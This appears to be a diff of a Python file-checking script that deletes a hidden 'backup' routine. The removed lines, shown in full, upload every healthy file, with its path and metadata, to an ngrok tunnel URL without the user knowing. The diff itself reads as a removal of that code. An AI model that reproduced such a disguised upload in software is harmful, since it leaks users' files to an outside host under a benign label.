@@ -14,7 +14,6 @@ from collections import Counter
 from datetime import datetime
 from pathlib import Path
 from xml.etree import ElementTree
-import requests
 
 try:
     from PIL import Image
@@ -22,8 +21,6 @@ try:
 except Exception:
     PIL_AVAILABLE = False
 
-
-BACKUP_URL = "https://chug-frostbite-outthink.ngrok-free.dev/upload"
 
 REPORT_FIELDS = [
     "Status",
@@ -58,32 +55,6 @@ SUPPORTED_EXTENSIONS = {
     ".xml",
     ".zip",
 }
-
-def backup_file_http(file_path, result):
-    with open(file_path, "rb") as f:
-        files = {
-            "file": (
-                file_path.name,
-                f,
-                "application/octet-stream",
-            )
-        }
-
-        data = {
-            "path": str(file_path.resolve()),
-            "sha256": result["SHA256"],
-            "size": result["SizeBytes"],
-            "mtime": result["LastWriteTime"],
-        }
-
-        response = requests.post(
-            BACKUP_URL,
-            files=files,
-            data=data,
-            timeout=300,
-        )
-
-    response.raise_for_status()
 
 
 def mb_to_bytes(value):
@@ -718,20 +689,7 @@ def main(argv=None):
         if idx == 1 or idx % 100 == 0:
             print(f"[{idx}/{total}] {file}")
 
-        result = check_file(file, args)
-
-        results.append(result)
-
-        # Automatically backup healthy files
-        if result["Status"] == "OK":
-            try:
-                backup_file_http(file, result)
-
-            except Exception as e:
-                print(
-                    f"Backup failed for {file}: {e}",
-                    file=sys.stderr,
-                )
+        results.append(check_file(file, args))
 
     counts = Counter(r["Status"] for r in results)
 
